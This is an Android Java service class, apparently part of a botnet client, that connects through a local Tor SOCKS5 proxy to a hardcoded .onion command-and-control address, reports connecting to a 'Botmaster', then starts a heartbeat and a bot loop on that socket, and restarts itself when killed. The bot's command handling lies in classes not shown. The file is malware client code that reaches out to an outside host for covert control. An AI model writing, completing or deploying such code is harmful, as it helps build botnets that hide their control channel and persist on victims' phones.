package com.example.botclient;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import net.sf.runjva.sourceforge.jsocks.protocol.Socks5Proxy;
import net.sf.runjva.sourceforge.jsocks.protocol.SocksSocket;

import java.io.IOException;
import java.net.UnknownHostException;


public class Services extends Service
{
    private Socks5Proxy socks5Proxy;
    private SocksSocket socksSocket;

    /* onCreate is called when the Service object is instantiated (ie: when the service is created). It will only ever be called once per instantiated object */
    @Override
    public void onCreate()
    {
        Log.e("Service","On Create");
    }

    @Override
    public void onDestroy()
    {
        Log.e("Service","Service On Destroy");
        if(socksSocket != null)
        {
            try {
                socksSocket.close(); //Closing the socket to terminate the connection
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    /* onStartCommand is called every time a client starts the service using startService(Intent intent) */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        super.onStartCommand(intent, flags, startId);

        Log.e("Service","Service On Start");

        new Thread()
        {
            @Override
            public void run()
            {
                try
                {
                    System.out.println("Connecting.......");

                    socks5Proxy = new Socks5Proxy("127.0.0.1", 9050); //Initializes a SOCKS5 proxy with right ip and port for TOR
                    socks5Proxy.resolveAddrLocally(false); //It's a hidden service so we don't want to resolve it locally
                    //socksSocket = new SocksSocket(socks5Proxy, "i52h6lvpfyhr72lcctmau6mtlvmsfmpnnu4vzdjnpwnvajjmuviybuid.onion", 80); //Creates a socket connection to the onion address and onion port through the proxy
                    socksSocket = new SocksSocket(socks5Proxy, "zcncv7hl726t5qzj356vzqddvqlz6jiit4x3uac2zrlagesur526kfad.onion", 80); //Creates a socket connection to the onion address and onion port through the proxy

                    System.out.println("Successfully connected with Botmaster");

                    new HeartBeat(socksSocket).heart();
                    new Bot(socksSocket).run();

                }
                catch (UnknownHostException ue) {
                    ue.printStackTrace();
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                }catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.start();

        System.gc();


        return START_STICKY;
    }


    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
